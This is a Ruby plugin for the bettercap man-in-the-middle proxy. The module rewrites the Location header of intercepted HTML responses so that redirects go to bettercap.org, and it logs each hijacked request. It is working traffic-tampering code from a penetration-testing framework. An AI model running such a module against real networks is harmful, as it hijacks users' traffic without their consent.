=begin

BETTERCAP

Author : Francesco 'hex7c0' Carnielli
Email  : hex7c0@gmail.com

This project is released under the GPL 3 license.

=end
class LocationHijacking < Proxy::Module
  def on_request( request, response )
    # is it a html page?
    if response.content_type =~ /^text\/html.*/
      for h in response.headers
        # prevent Request loop
        if /^Location: (?!http:\/\/bettercap.org)/.match(h)
          Logger.info "Hijacking http://#{request.host}#{request.url} request"
          h.replace('Location: http://bettercap.org')
        end
      end
    end
  end
end
